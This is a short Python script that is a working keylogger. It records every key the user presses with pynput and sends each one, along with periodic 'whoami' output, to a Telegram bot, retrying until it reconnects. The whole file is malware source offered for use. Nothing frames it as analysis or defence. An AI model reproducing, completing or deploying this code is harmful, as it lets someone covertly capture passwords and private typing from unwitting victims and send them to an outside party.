import os
import time
import subprocess
from pynput import keyboard
import telebot

bot_token = 'bot_token'
chat_id = 'chat_id'
bot = telebot.TeleBot(token=bot_token)

def on_press(key):
    try:
        activity = f'pressed {key.char}'
        send_activity(activity)
    except AttributeError:
        activity = f'pressed {key}'
        send_activity(activity)

def send_activity(activity):
    try:
        # send the activity to the Telegram bot
        bot.send_message(chat_id=chat_id, text=activity)
    except Exception as e:
        # handle any exceptions that may occur (e.g. timeout or no internet connection)
        print(f"Error sending activity: {str(e)}")
        time.sleep(10)
        send_activity(activity)

def reconnect():
    while True:
        try:
            # attempt to connect to the Telegram bot
            bot.send_message(chat_id=chat_id, text='Reconnected!')

            # if successful, return True
            return True

        except Exception as e:
            # handle any exceptions that may occur (e.g. timeout or no internet connection)
            print(f"Error reconnecting: {str(e)}")
            time.sleep(10)

keyboard_listener = keyboard.Listener(on_press=on_press)

# start the listeners
keyboard_listener.start()

# run the script indefinitely
while True:
    try:
        # execute a shell command to get your activity (replace with your desired command)
        activity = subprocess.check_output(['whoami']).decode('utf-8')

        # send the activity to the Telegram bot
        send_activity(activity)

        # attempt to send the activity to the Telegram bot after 1 minute
        time.sleep(60)

    except Exception as e:
        # handle any exceptions that may occur (e.g. timeout or no internet connection)
        print(f"Error sending activity: {str(e)}")
        reconnect()

# stop the listeners
keyboard_listener.stop()
